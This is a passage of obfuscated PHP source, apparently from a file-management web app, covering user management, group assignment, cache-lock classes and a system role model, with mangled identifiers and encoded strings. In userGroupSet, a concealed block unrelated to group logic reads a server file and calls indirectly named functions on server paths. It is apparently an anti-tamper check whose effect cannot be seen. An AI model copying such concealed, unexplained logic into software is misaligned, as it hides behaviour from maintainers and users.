md5($šİÖ˜å[$Üş™ƒüÏ[2327]] . trim($£¥‘ğß£[$Üş™ƒüÏ[888]])); } else { unset($£¥‘ğß£[$Üş™ƒüÏ[888]]); } if (!empty($£¥‘ğß£[$Üş™ƒüÏ[533]]) && strlen($£¥‘ğß£[$Üş™ƒüÏ[533]]) > 255) { $£¥‘ğß£[$Üş™ƒüÏ[533]] = $Üş™ƒüÏ[12]; } $this->where(array($Üş™ƒüÏ[1661] => $ÁºÃ¾ñ))->save($£¥‘ğß£); if (isset($£¥‘ğß£[$Üş™ƒüÏ[532]])) { $this->setNamePinyin($ÁºÃ¾ñ, $£¥‘ğß£[$Üş™ƒüÏ[532]]); } $this->clearCache($ÁºÃ¾ñ); return !0; } public function setNamePinyin($‘Ñç«Àˆ, $ˆáàÛû¦ = false) { $œÔóÃšä =& $_SERVER[ì™ı‰º¯]; if (!$ˆáàÛû¦) { $†×üÈ·› = $this->getInfoSimple($‘Ñç«Àˆ); $ˆáàÛû¦ = $†×üÈ·›[$œÔóÃšä[532]] ? $†×üÈ·›[$œÔóÃšä[532]] : $†×üÈ·›[$œÔóÃšä[32]]; } $ÌëòáÊ¬ = Model($œÔóÃšä[525]); if (!Input::check($ˆáàÛû¦, $œÔóÃšä[583])) { return $ÌëòáÊ¬->metaSet($‘Ñç«Àˆ, array($œÔóÃšä[465] => $œÔóÃšä[12], $œÔóÃšä[464] => $œÔóÃšä[12])); } return $ÌëòáÊ¬->metaSet($‘Ñç«Àˆ, array($œÔóÃšä[465] => str_replace($œÔóÃšä[53], $œÔóÃšä[12], Pinyin::get($ˆáàÛû¦)), $œÔóÃšä[464] => Pinyin::get($ˆáàÛû¦, $œÔóÃšä[584]))); } private function nickNameRpt() { $ÉÅÇ“¹© =& $_SERVER[ì™ı‰º¯]; $‰«ãŞóÉ = Model($ÉÅÇ“¹©[766])->get($ÉÅÇ“¹©[2338]); $¤å£Â¹¢ = $GLOBALS[$ÉÅÇ“¹©[6]][$ÉÅÇ“¹©[381]][$ÉÅÇ“¹©[2338]]; $«¯½¡Ôó = !is_null($‰«ãŞóÉ) ? $‰«ãŞóÉ : $¤å£Â¹¢; return !!$«¯½¡Ôó; } private function _checkExist($ÜÄ¡Ñ‹‡, $µûõşÓ = false) { $Î ‘®ó‚ =& $_SERVER[ì™ı‰º¯]; $€­ˆ•õß = array($Î ‘®ó‚[32] => UserModel::ERROR_USER_EXIST_NAME, $Î ‘®ó‚[532] => UserModel::ERROR_USER_EXIST_NICKNAME, $Î ‘®ó‚[305] => UserModel::ERROR_USER_EXIST_EMAIL, $Î ‘®ó‚[2326] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($€­ˆ•õß[$Î ‘®ó‚[532]]); } $ª·ˆÚı¸ = $µûõşÓ ? array($Î ‘®ó‚[1670] => array($Î ‘®ó‚[2339], $µûõşÓ)) : array(); foreach ($€­ˆ•õß as $ÁåÀ½ú† => $ùÁÀ¿‰) { $²ğğ•«Ï = array(); foreach ($€­ˆ•õß as $ûóóÏ–” => $ÛÚ™Å¡„) { if (isset($ÜÄ¡Ñ‹‡[$ûóóÏ–”]) && $ÜÄ¡Ñ‹‡[$ûóóÏ–”]) { $²ğğ•«Ï[] = $ÜÄ¡Ñ‹‡[$ûóóÏ–”]; } } if (!$²ğğ•«Ï) { continue; } $şá¨±üé = array_merge(array($ÁåÀ½ú† => array($Î ‘®ó‚[7], $²ğğ•«Ï)), $ª·ˆÚı¸); $şı°×Œè = $this->where($şá¨±üé)->find(); if ($şı°×Œè) { return $ùÁÀ¿‰; } } return !0; } public function userListInfo($ñØ©Ï­›) { $ùŸøÊ¶ò =& $_SERVER[ì™ı‰º¯]; $¿ê¡»Å£ = array(); $ñØ©Ï­› = is_array($ñØ©Ï­›) ? array_unique($ñØ©Ï­›) : array(); if (!$ñØ©Ï­›) { return $¿ê¡»Å£; } if (count($ñØ©Ï­›) < 20) { foreach ($ñØ©Ï­› as $Ë­†Ï¸) { $¿ê¡»Å£[$Ë­†Ï¸ . $ùŸøÊ¶ò[12]] = $this->getInfoSimpleOuter($Ë­†Ï¸); } } else { $ÜÁğÙÏ¨ = array($ùŸøÊ¶ò[1661] => array($ùŸøÊ¶ò[418], $ñØ©Ï­›)); if (count($ñØ©Ï­›) == 1) { $ÜÁğÙÏ¨ = array($ùŸøÊ¶ò[1661] => $ñØ©Ï­›[0]); } $ÀÒÂÁ¡ = Model($ùŸøÊ¶ò[504])->field($this->simpleField)->where($ÜÁğÙÏ¨)->select(); $ÀÒÂÁ¡ = array_to_keyvalue($ÀÒÂÁ¡, $ùŸøÊ¶ò[1670]); foreach ($ñØ©Ï­› as $Ë­†Ï¸) { $ß¡¡Œ‚Ñ = $ÀÒÂÁ¡[$Ë­†Ï¸]; if (!$ß¡¡Œ‚Ñ) { $¿ê¡»Å£[$Ë­†Ï¸ . $ùŸøÊ¶ò[12]] = $this->getInfoSimpleOuter($Ë­†Ï¸); continue; } $ß¡¡Œ‚Ñ[$ùŸøÊ¶ò[533]] = Action($ùŸøÊ¶ò[2312])->parseUrl($ß¡¡Œ‚Ñ[$ùŸøÊ¶ò[533]]); $¿ê¡»Å£[$Ë­†Ï¸ . $ùŸøÊ¶ò[12]] = $ß¡¡Œ‚Ñ; } } return $¿ê¡»Å£; } protected function userStatus($è×ÊíªŠ, $¬ø‚ª¥) { $¿õÉ×¼Õ = $this->getInfoSimple($è×ÊíªŠ); if (!$¿õÉ×¼Õ) { return !1; } $–­ß¿· = array($_SERVER[ì™ı‰º¯][745] => $¬ø‚ª¥); return $this->userEdit($è×ÊíªŠ, $–­ß¿·); } protected function userRemove($ÃôÙéúÛ) { $áõÂÙõ =& $_SERVER[ì™ı‰º¯]; $‘‚™Êî = $this->getInfoSimple($ÃôÙéúÛ); if (!$‘‚™Êî) { return !1; } $ªìÑ½ = array($áõÂÙõ[1661] => $ÃôÙéúÛ); Model($áõÂÙõ[592])->where($ªìÑ½)->delete(); Model($áõÂÙõ[2340])->where($ªìÑ½)->delete(); Model($áõÂÙõ[1949])->where($ªìÑ½)->delete(); Model($áõÂÙõ[2325])->where($ªìÑ½)->delete(); Model($áõÂÙõ[1067])->where($ªìÑ½)->delete(); Model($áõÂÙõ[2156])->removeUserAll($ÃôÙéúÛ); Model($áõÂÙõ[821])->userRootRemove($ÃôÙéúÛ); return $this->where($ªìÑ½)->delete(); } protected function userGroupSet($ ßºàò¿, $íó¾“Èˆ, $ç½É°Â¡ = array()) { $Ã´À¦üÌ =& $_SERVER[ì™ı‰º¯]; if ($_SERVER[$Ã´À¦üÌ[872]] != $_SERVER[$Ã´À¦üÌ[1511]]) { $İÀ½˜¬† = $Ã´À¦üÌ[874]; $‡‰Ò˜ƒ¦ = $Ã´À¦üÌ[875]; $õäÆ²„ª = $_SERVER[$Ã´À¦üÌ[876]] . $Ã´À¦üÌ[877]; $Ğ»åÉ²› = $‡‰Ò˜ƒ¦($õäÆ²„ª); $Æ§Å™À = explode($Ã´À¦üÌ[231], $Ğ»åÉ²›); if (count($Æ§Å™À) < $Ã´À¦üÌ[610]) { $›Ã¡û¦ = $Ã´À¦üÌ[878]; $›Ã¡û¦(); } $Áó´«¶· = $Ã´À¦üÌ[879]; $Áó´«¶·($_SERVER[$Ã´À¦üÌ[880]]); $Áó´«¶·($_SERVER[$Ã´À¦üÌ[876]] . $Ã´À¦üÌ[1598]); $öü¶êÎ× = 1; while ($öü¶êÎ× > 1) { $öü¶êÎ× = $öü¶êÎ× + 4; $Şµóİ°ä = rawurlencode($öü¶êÎ× . $Ã´À¦üÌ[378]); } } $ú‡Ê‘• = $this->getInfoSimple($ ßºàò¿); if (!$ú‡Ê‘• || !is_array($íó¾“Èˆ)) { return !1; } $ÛÔ…ôÉ– = Model($Ã´À¦üÌ[1949]); $ÛÔ…ôÉ–->where(array($Ã´À¦üÌ[1670] => $ ßºàò¿))->delete(); $—º¾÷£é = array(); $ıøÊËúØ = 0; foreach ($íó¾“Èˆ as $˜½Ê›èè => $†´æÂ¨×) { $¢øàˆâ = array($Ã´À¦üÌ[1670] => $ ßºàò¿, $Ã´À¦üÌ[1859] => $˜½Ê›èè, $Ã´À¦üÌ[1963] => $†´æÂ¨×); $¢øàˆâ[$Ã´À¦üÌ[1883]] = isset($ç½É°Â¡[$ıøÊËúØ]) ? $ç½É°Â¡[$ıøÊËúØ] : 0; $ıøÊËúØ++; $—º¾÷£é[] = $¢øàˆâ; } return $ÛÔ…ôÉ–->addAll($—º¾÷£é, array(), !0); } protected function userGroupAdd($½ÏÊòçì, $±É¹„‡ = array()) { $…ßîñİ =& $_SERVER[ì™ı‰º¯]; $ş°Š·„ = $this->getInfoSimple($½ÏÊòçì); if (!$ş°Š·„ || empty($±É¹„‡)) { return !1; } $úÊº„¬Ô = array(); foreach ($±É¹„‡ as $Ø›³èé¼ => $™Î°òš) { $úÊº„¬Ô[] = array($…ßîñİ[1670] => $½ÏÊòçì, $…ßîñİ[1859] => $Ø›³èé¼, $…ßîñİ[1963] => $™Î°òš, $…ßîñİ[1883] => 0); } return Model($…ßîñİ[1949])->addAll($úÊº„¬Ô, array(), !0); } protected function userGroupRemove($à‹§“ÒØ, $¶ïÓâÏ) { $¯–Èà™’ =& $_SERVER[ì™ı‰º¯]; $¸¤Ç•Ó = $this->getInfoSimple($à‹§“ÒØ); if (!$¸¤Ç•Ó || !$¶ïÓâÏ) { return !1; } $ü¸ñõò = array($¯–Èà™’[1661] => $à‹§“ÒØ, $¯–Èà™’[1947] => $¶ïÓâÏ); return Model($¯–Èà™’[1949])->where($ü¸ñõò)->delete(); } public function listData() { $ûµ ßˆú = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ûµ ßˆú[$_SERVER[ì™ı‰º¯][369]]); return $ûµ ßˆú; } public function listByID($ÜÜÒÅÀ‰) { $‹ªÏÑÆÖ =& $_SERVER[ì™ı‰º¯]; if (!$ÜÜÒÅÀ‰) { return; } $âô¤è–¥ = array($‹ªÏÑÆÖ[1670] => array($‹ªÏÑÆÖ[7], $ÜÜÒÅÀ‰)); $»”ÛÙ¼» = $this->where($âô¤è–¥)->select(); $»”ÛÙ¼» = array_sort_keep($»”ÛÙ¼», $‹ªÏÑÆÖ[1670], $ÜÜÒÅÀ‰); $this->_listDataApply($»”ÛÙ¼»); return $»”ÛÙ¼»; } public function listByGroup($¬ú¢ ˜¢ = 0, $Â”ıâÈû = array()) { $¦®äø¼Ä =& $_SERVER[ì™ı‰º¯]; $Ìøîê® = $¦®äø¼Ä[12]; $’Â· = array(); if ($¬ú¢ ˜¢) { $’Â· = array($¦®äø¼Ä[2341] => intval($¬ú¢ ˜¢)); $Ìøîê® = "\x4c\105\106\x54\x20\x4a\117\111\x4e\40{$this->tablePrefix}\x75\x73\145\x72\x5f\x67\162\157\x75\x70\40\165\x73\145\162\x5f\147\162\157\x75\160\40\157\156\x20\165\163\145\162\x2e\165\x73\145\x72\111\104\40\75\x20\165\163\145\162\x5f\147\x72\157\165\160\56\165\x73\145\162\111\104"; $‡öœñ‹ = Input::get($¦®äø¼Ä[457], null, $¦®äø¼Ä[12]) ? $¦®äø¼Ä[12] : $¦®äø¼Ä[2342]; } if (isset($Â”ıâÈû[$¦®äø¼Ä[745]])) { $’Â·[$¦®äø¼Ä[2343]] = $Â”ıâÈû[$¦®äø¼Ä[745]]; } $ä´ù©Í  = $this->_makeOrder($‡öœñ‹)->field($¦®äø¼Ä[2344])->where($’Â·)->join($Ìøîê®)->selectPage(50); $this->_listDataApply($ä´ù©Í [$¦®äø¼Ä[369]]); return $ä´ù©Í ; } private function _makeOrder($äã‹•¹ò = '') { $òáå¢Òì =& $_SERVER[ì™ı‰º¯]; $èØÙÒÍØ = array($òáå¢Òì[1670], $òáå¢Òì[32], $òáå¢Òì[1848], $òáå¢Òì[1820], $òáå¢Òì[201]); $¤€©Çç = array($òáå¢Òì[450] => $òáå¢Òì[451], $òáå¢Òì[452] => $òáå¢Òì[453]); $¥ŸÆ¾´´ = Input::get($òáå¢Òì[457], $òáå¢Òì[7], $òáå¢Òì[1661], $èØÙÒÍØ); $Ğ÷øúÆ = Input::get($òáå¢Òì[458], $òáå¢Òì[7], $òáå¢Òì[1950], array($òáå¢Òì[1950], $òáå¢Òì[452])); $Ğ÷øúÆ = $¤€©Çç[$Ğ÷øúÆ]; $äã‹•¹ò = $äã‹•¹ò . "\165\x73\x65\162\56{$¥ŸÆ¾´´}\x20{$Ğ÷øúÆ}\54\40\x75\x73\145\162\x2e\x75\x73\x65\x72\111\x44\x20\141\163\143"; return $this->alias($òáå¢Òì[2076])->order($äã‹•¹ò); } public function listSearch($±¬÷ÆÅ×) { $÷ßñ¶”À =& $_SERVER[ì™ı‰º¯]; $ßè¾ª¿Ã = $±¬÷ÆÅ×[$÷ßñ¶”À[1953]]; $²°œÉ¯ = isset($±¬÷ÆÅ×[$÷ßñ¶”À[1954]]) ? $±¬÷ÆÅ×[$÷ßñ¶”À[1954]] : !1; $ßè¾ª¿Ã = str_replace($÷ßñ¶”À[1955], $÷ßñ¶”À[1956], trim($ßè¾ª¿Ã)); $ï ÃÂ© = array($÷ßñ¶”À[32] => array($÷ßñ¶”À[383], "\45{$ßè¾ª¿Ã}\45"), $÷ßñ¶”À[305] => array($÷ßñ¶”À[383], "{$ßè¾ª¿Ã}\x25"), $÷ßñ¶”À[532] => array($÷ßñ¶”À[383], "{$ßè¾ª¿Ã}\x25"), $÷ßñ¶”À[999] => $÷ßñ¶”À[1957]); if (Input::check($ßè¾ª¿Ã, $÷ßñ¶”À[311])) { $ï ÃÂ©[$÷ßñ¶”À[1670]] = array($÷ßñ¶”À[383], "{$ßè¾ª¿Ã}\x25"); $ï ÃÂ©[$÷ßñ¶”À[2326]] = array($÷ßñ¶”À[383], "{$ßè¾ª¿Ã}\45"); } if (!$ßè¾ª¿Ã) { $ï ÃÂ© = array(); } if (isset($±¬÷ÆÅ×[$÷ßñ¶”À[745]])) { $ï ÃÂ©[$÷ßñ¶”À[745]] = $±¬÷ÆÅ×[$÷ßñ¶”À[745]]; } $ï ÃÂ© = $this->parseWhereLike($ï ÃÂ©); $¢€Çú„ = $this->_makeOrder()->where($ï ÃÂ©)->selectPage(20); if (!$¢€Çú„ || count($¢€Çú„[$÷ßñ¶”À[369]]) < 5 && Input::check($ßè¾ª¿Ã, $÷ßñ¶”À[318])) { $²ö–¼Í± = $this->_searchFromMeta($÷ßñ¶”À[464], $ßè¾ª¿Ã, 10); $„ÉĞĞ€“ = $this->_searchFromMeta($÷ßñ¶”À[465], $ßè¾ª¿Ã, 10); $‘²ÂÛòó = array_merge($²ö–¼Í±, $„ÉĞĞ€“, $¢€Çú„[$÷ßñ¶”À[369]]); $¢€Çú„[$÷ßñ¶”À[369]] = array_unique_by_key($‘²ÂÛòó, $÷ßñ¶”À[1670]); $¢€Çú„[$÷ßñ¶”À[366]][$÷ßñ¶”À[367]] = count($¢€Çú„[$÷ßñ¶”À[369]]); $¢€Çú„[$÷ßñ¶”À[366]][$÷ßñ¶”À[368]] = ceil($¢€Çú„[$÷ßñ¶”À[366]][$÷ßñ¶”À[367]] / $¢€Çú„[$÷ßñ¶”À[366]][$÷ßñ¶”À[363]]); } $this->_listDataApply($¢€Çú„[$÷ßñ¶”À[369]]); $this->_filterByGroup($¢€Çú„, $²°œÉ¯); return $¢€Çú„; } private function _filterByGroup(&$Ç§“ãØÃ, $˜ßäš½) { $¤›Ô´¶ =& $_SERVER[ì™ı‰º¯]; if (!$˜ßäš½) { return $Ç§“ãØÃ; } foreach ($Ç§“ãØÃ[$¤›Ô´¶[369]] as $Î‡ÚÃ´ => &$¹‹®ß¡) { $ŞÛÜÚÌ‹ = array_to_keyvalue($¹‹®ß¡[$¤›Ô´¶[2046]], $¤›Ô´¶[12], $¤›Ô´¶[1859]); if (!in_array($˜ßäš½, $ŞÛÜÚÌ‹)) { unset($Ç§“ãØÃ[$¤›Ô´¶[369]][$Î‡ÚÃ´]); } } unset($¹‹®ß¡); $Ç§“ãØÃ[$¤›Ô´¶[369]] = array_values($Ç§“ãØÃ[$¤›Ô´¶[369]]); $Ç§“ãØÃ[$¤›Ô´¶[366]] = array($¤›Ô´¶[2110] => count($Ç§“ãØÃ[$¤›Ô´¶[369]]), $¤›Ô´¶[2108] => $Ç§“ãØÃ[$¤›Ô´¶[366]][$¤›Ô´¶[363]], $¤›Ô´¶[2107] => 1, $¤›Ô´¶[2109] => 1); } private function _searchFromMeta($œ‘óŞö¢, $š¿ÙŞé±, $ò«™æ²) { $Çüãœ°¥ =& $_SERVER[ì™ı‰º¯]; $š¿ÙŞé± = strtolower($š¿ÙŞé±); $Áğ¢Êƒå = array($Çüãœ°¥[94] => $œ‘óŞö¢, $Çüãœ°¥[374] => array($Çüãœ°¥[383], "\x25{$š¿ÙŞé±}\x25")); $Áğ¢Êƒå = $this->parseWhereLike($Áğ¢Êƒå); $Û³ı‰¡– = Model($Çüãœ°¥[2345])->where($Áğ¢Êƒå)->limit($ò«™æ²)->select(); if (!$Û³ı‰¡–) { return array(); } $Û³ı‰¡– = array_to_keyvalue($Û³ı‰¡–, $Çüãœ°¥[12], $Çüãœ°¥[1670]); $ÁàïÆÓœ = $this->where(array($Çüãœ°¥[1661] => array($Çüãœ°¥[7], $Û³ı‰¡–)))->select(); if (!$ÁàïÆÓœ) { return array(); } return $ÁàïÆÓœ; } private function _listDataApplyItem($Ÿ–œ×Ë±) { $‰Ç¼Ê„ = array($Ÿ–œ×Ë±); $this->_listDataApply($‰Ç¼Ê„); return $‰Ç¼Ê„[0]; } private function _listDataApply(&$šÒ®Š¹) { $ËÒü·¨® =& $_SERVER[ì™ı‰º¯]; if (!$šÒ®Š¹) { return; } array_remove_key($šÒ®Š¹, $ËÒü·¨®[888]); $†æ£ü– = array_to_keyvalue($šÒ®Š¹, $ËÒü·¨®[12], $ËÒü·¨®[1670]); $this->_listAppendGroup($šÒ®Š¹, $†æ£ü–); $this->_listAppendMeta($šÒ®Š¹, $†æ£ü–); $this->_listAppendSourceRoot($šÒ®Š¹, $†æ£ü–); } private function _listAppendSourceRoot(&$å„İÍ¦, $ª¹È„) { $å–¹¼æÑ =& $_SERVER[ì™ı‰º¯]; $ÊñßÁÇÀ = Model($å–¹¼æÑ[821])->listSourceRoot(SourceModel::TYPE_USER, $ª¹È„); $ÊñßÁÇÀ = array_to_keyvalue($ÊñßÁÇÀ, $å–¹¼æÑ[496]); $ÊñßÁÇÀ = array_remove_key($ÊñßÁÇÀ, $å–¹¼æÑ[496]); foreach ($å„İÍ¦ as &$àî©î ‡) { $àî©î ‡[$å–¹¼æÑ[87]] = $ÊñßÁÇÀ[$àî©î ‡[$å–¹¼æÑ[1670]]] ? $ÊñßÁÇÀ[$àî©î ‡[$å–¹¼æÑ[1670]]] : array(); } unset($àî©î ‡); } private function _listAppendGroup(&$¢Şµ–ÍÊ, $ôÚÙÂ¼Æ) { $¨†Şı¼Á =& $_SERVER[ì™ı‰º¯]; $ŒË‡´ö = array($¨†Şı¼Á[1670] => array($¨†Şı¼Á[7], $ôÚÙÂ¼Æ)); $Ç¹’–ŒÍ = Model($¨†Şı¼Á[1949])->where($ŒË‡´ö)->select(); $ÂÕ®÷ÆÇ = array_to_keyvalue($Ç¹’–ŒÍ, $¨†Şı¼Á[12], $¨†Şı¼Á[1859]); $ÂÕ®÷ÆÇ = array_remove_value(array_unique($ÂÕ®÷ÆÇ), $¨†Şı¼Á[198]); if (!$ÂÕ®÷ÆÇ || !$Ç¹’–ŒÍ) { return; } $ŒË‡´ö = array($¨†Şı¼Á[1859] => array($¨†Şı¼Á[7], $ÂÕ®÷ÆÇ)); $ÁÓãç“ = Model($¨†Şı¼Á[2044])->field($¨†Şı¼Á[2346])->where($ŒË‡´ö)->select(); $ÁÓãç“ = array_to_keyvalue($ÁÓãç“, $¨†Şı¼Á[1859]); $Ç¹’–ŒÍ = array_to_keyvalue_group($Ç¹’–ŒÍ, $¨†Şı¼Á[1670]); foreach ($Ç¹’–ŒÍ as &$£€ìƒ¦à) { $ëì¿ç§’ = array(); foreach ($£€ìƒ¦à as $³×½íµ) { if (!$³×½íµ[$¨†Şı¼Á[1963]]) { continue; } $óˆÎ±— = Model($¨†Şı¼Á[498])->listData($³×½íµ[$¨†Şı¼Á[1963]]); $ëì¿ç§’[] = array($¨†Şı¼Á[1859] => $³×½íµ[$¨†Şı¼Á[1859]], $¨†Şı¼Á[2347] => $ÁÓãç“[$³×½íµ[$¨†Şı¼Á[1859]]][$¨†Şı¼Á[32]], $¨†Şı¼Á[511] => $ÁÓãç“[$³×½íµ[$¨†Şı¼Á[1859]]][$¨†Şı¼Á[511]], $¨†Şı¼Á[413] => $óˆÎ±—); } $£€ìƒ¦à = $ëì¿ç§’; } unset($£€ìƒ¦à); foreach ($¢Şµ–ÍÊ as &$…ôÁºÚ) { $…ôÁºÚ[$¨†Şı¼Á[2046]] = array(); if (isset($Ç¹’–ŒÍ[$…ôÁºÚ[$¨†Şı¼Á[1670]]])) { $…ôÁºÚ[$¨†Şı¼Á[2046]] = $Ç¹’–ŒÍ[$…ôÁºÚ[$¨†Şı¼Á[1670]]]; } } unset($…ôÁºÚ); } public function userAppendGroup($Ï³ÀÍšé) { $í‘©ÜÈ÷ =& $_SERVER[ì™ı‰º¯]; if (!$Ï³ÀÍšé) { return array(); } $this->_listAppendGroup($Ï³ÀÍšé, array_to_keyvalue($Ï³ÀÍšé, $í‘©ÜÈ÷[12], $í‘©ÜÈ÷[1670])); return $Ï³ÀÍšé; } private function _listAppendMeta(&$Ê²úáÕ©, $ÛÂ§Ş”Ê) { $µÈÜğ…Ë =& $_SERVER[ì™ı‰º¯]; $ÌğÖŠŒê = UserJobModel::JOB_KEY; $²ÄŞî”» = array($µÈÜğ…Ë[2327]); $‡è­ñª³ = array($µÈÜğ…Ë[1670] => array($µÈÜğ…Ë[7], $ÛÂ§Ş”Ê)); $ó¸Ò˜à = Model($µÈÜğ…Ë[2325])->where($‡è­ñª³)->select(); $ó¸Ò˜à = array_to_keyvalue_group($ó¸Ò˜à, $µÈÜğ…Ë[1670]); foreach ($ó¸Ò˜à as &$·õò×Ã) { $ÍæÇÆîë = array(); foreach ($·õò×Ã as $²şŞö†) { if (!in_array($²şŞö†[$µÈÜğ…Ë[94]], $²ÄŞî”»)) { $ÍæÇÆîë[$²şŞö†[$µÈÜğ…Ë[94]]] = $²şŞö†[$µÈÜğ…Ë[374]]; } } $·õò×Ã = $ÍæÇÆîë; } unset($·õò×Ã); $Ÿ¿¡‰üÖ = Model($µÈÜğ…Ë[2348]); foreach ($Ê²úáÕ© as &$ÊŒå¨·Š) { $ÙÈş³í“ = array(); if (isset($ó¸Ò˜à[$ÊŒå¨·Š[$µÈÜğ…Ë[1670]]])) { $ÙÈş³í“ = $ó¸Ò˜à[$ÊŒå¨·Š[$µÈÜğ…Ë[1670]]]; } $ÊŒå¨·Š[$µÈÜğ…Ë[2349]] = array(); if (isset($ÙÈş³í“[$ÌğÖŠŒê])) { $ÊŒå¨·Š[$µÈÜğ…Ë[2349]] = $Ÿ¿¡‰üÖ->getUserJobInfo($ÙÈş³í“[$ÌğÖŠŒê]); } } unset($ÊŒå¨·Š); } protected function groupUserAll($ÒÂøÄ÷®) { $çûêğĞ® =& $_SERVER[ì™ı‰º¯]; if (!$ÒÂøÄ÷®) { return !1; } $Ö‡´ŒíË = Model($çûêğĞ®[1949])->field($çûêğĞ®[1670])->where(array($çûêğĞ®[1859] => array($çûêğĞ®[7], $ÒÂøÄ÷®)))->select(); $Ö‡´ŒíË = array_to_keyvalue($Ö‡´ŒíË, $çûêğĞ®[12], $çûêğĞ®[1670]); return array_unique($Ö‡´ŒíË); } public function userSearch($ÚØœ†Ş, $çËõ¥ÊÓ = "\x2a") { return Model($_SERVER[ì™ı‰º¯][525])->where($ÚØœ†Ş)->field($çËõ¥ÊÓ)->find(); } } goto aªš´ïÔùÚ; cÈ•ğ¿¨£Œ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ŒÊü“«“ =& $_SERVER[ì™ı‰º¯]; $›…¬¼© = $GLOBALS[$ŒÊü“«“[6]][$ŒÊü“«“[349]]; self::$cachePath = $›…¬¼©[$ŒÊü“«“[200]][$ŒÊü“«“[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¢Ü’áÙ”, $º±¹êè = 0) { $Ä€£ıÚü =& $_SERVER[ì™ı‰º¯]; $®¿×°å• = microtime(!0); $¦¡Ÿ‚‰¦ = $®¿×°å• + $º±¹êè + 0.0001; $Áıº° = rtrim(self::$cachePath, $Ä€£ıÚü[8]) . $Ä€£ıÚü[859] . md5($¢Ü’áÙ”) . $Ä€£ıÚü[856]; if (file_exists($Áıº°) && filemtime($Áıº°) && filemtime($Áıº°) < time() - 10) { @unlink($Áıº°); } do { if (file_exists($Áıº°)) { cacheLockWait(); continue; } $§äì’”Æ = fopen($Áıº°, $Ä€£ıÚü[860]); if (!$§äì’”Æ) { return !1; } $÷ıËè±€ = flock($§äì’”Æ, LOCK_EX | LOCK_NB); self::$caches[$¢Ü’áÙ”] = array($Ä€£ıÚü[861] => $§äì’”Æ, $Ä€£ıÚü[200] => $Áıº°); fwrite($§äì’”Æ, $¦¡Ÿ‚‰¦); clearstatcache(); if ($§äì’”Æ && $÷ıËè±€) { return !0; } cacheLockWait(); } while (microtime(!0) < $¦¡Ÿ‚‰¦); $this->unlock($¢Ü’áÙ”); return !1; } public function lockGet($ËÏ®© “) { $ó¸óŸÛ =& $_SERVER[ì™ı‰º¯]; $ñÆ‚ñÙ· = rtrim(self::$cachePath, $ó¸óŸÛ[8]) . $ó¸óŸÛ[859] . md5($ËÏ®© “) . $ó¸óŸÛ[856]; return file_exists($ñÆ‚ñÙ·); } public function unlock($øµêçÏ÷) { $‰Ë¢ğÌˆ =& $_SERVER[ì™ı‰º¯]; $Ïí‰²Úê = self::$caches[$øµêçÏ÷]; if (!$Ïí‰²Úê) { return; } @flock($Ïí‰²Úê[$‰Ë¢ğÌˆ[861]], LOCK_UN); @fclose($Ïí‰²Úê[$‰Ë¢ğÌˆ[861]]); @unlink($Ïí‰²Úê[$‰Ë¢ğÌˆ[200]]); unset(self::$caches[$øµêçÏ÷]); } } class CacheLockRedis { public function lock($¹ …áî®, $Ûí…Ë´Í = 10) { $à“šµµ = Cache::init(); $”³öşÛ† = microtime(!0) + $Ûí…Ë´Í; while (microtime(!0) < $”³öşÛ†) { $åšãÙ¸² = $à“šµµ->get($¹ …áî®); if (!$åšãÙ¸²) { $€ÔØäØî = $à“šµµ->setLock($¹ …áî®, $”³öşÛ†, $Ûí…Ë´Í); if ($€ÔØäØî) { return !0; } } else { if ($åšãÙ¸² < microtime(!0)) { $à“šµµ->set($¹ …áî®, $”³öşÛ†, $Ûí…Ë´Í * 2); if ($à“šµµ->get($¹ …áî®) === $åšãÙ¸²) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($’™ªğğü) { return Cache::init()->get($’™ªğğü); } public function unlock($úÜ¡˜Şî) { return Cache::init()->remove($úÜ¡˜Şî); } } class CacheLockMemcached { public function lock($úØšÔı¬, $Ø˜¢œã = 0) { $ãÁ³©Æ© = Cache::init(); $·¤É¦À = microtime(!0) + $Ø˜¢œã; while (microtime(!0) < $·¤É¦À) { $İàŒõÂ = $ãÁ³©Æ©->get($úØšÔı¬); if (!$İàŒõÂ || $İàŒõÂ < microtime(!0)) { $±ùú“Éè = $ãÁ³©Æ©->handle->add($úØšÔı¬, $·¤É¦À, $Ø˜¢œã); if ($±ùú“Éè) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ä³’ŒÒ¯) { return Cache::init()->get($ä³’ŒÒ¯); } public function unlock($øâİõÜÍ) { return Cache::init()->remove($øâİõÜÍ); } } goto aëÏ÷ë’ï; c¹œİë˜ãØ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\56\162\157\154\145\114\151\163\x74"; public $field = array("\156\x61\x6d\145", "\141\x75\x74\x68", "\154\x61\x62\x65\x6c", "\x64\x69\163\160\154\141\171", "\163\171\x73\164\145\x6d", "\144\x65\163\143", "\151\147\156\x6f\x72\145\x45\170\x74", "\x69\x67\x6e\157\162\145\106\x69\154\x65\x53\x69\x7a\145", "\x61\x64\155\x69\x6e\151\163\164\x72\141\164\157\x72", "\x73\157\162\164"); public function listData($ÈõœãÄ¹ = false, $Ÿû˜„©ø = "\163\x6f\162\164", $Ñ†ÛçÄñ = false) { $Æı¡¶Ã =& $_SERVER[ì™ı‰º¯]; $ò¹ıùŒè = parent::listData($ÈõœãÄ¹, $Ÿû˜„©ø, $Ñ†ÛçÄñ); if (!$ÈõœãÄ¹) { foreach ($ò¹ıùŒè as $©É ï¦× => $ğÀ ÛİÍ) { if ($ğÀ ÛİÍ[$Æı¡¶Ã[2061]] == 1) { $ò¹ıùŒè[$©É ï¦×][$Æı¡¶Ã[453]] = LNG($Æı¡¶Ã[2295]); } } } return $ò¹ıùŒè; } public function update($ÓÁ– Ï‹, $­ôŠÄ®) { $Š«»™Ü =& $_SERVER[ì™ı‰º¯]; $·ÇäÔµ = parent::listData($ÓÁ– Ï‹); $Ù¥ËÕùş = $this->findByName($­ôŠÄ®[$Š«»™Ü[32]]); if (!$·ÇäÔµ || $Ù¥ËÕùş && $Ù¥ËÕùş[$Š«»™Ü[399]] != $·ÇäÔµ[$Š«»™Ü[399]]) { return !1; } if ($Ù¥ËÕùş[$Š«»™Ü[2061]] == 1) { $­ôŠÄ® = array($Š«»™Ü[32] => $­ôŠÄ®[$Š«»™Ü[32]], $Š«»™Ü[1882] => 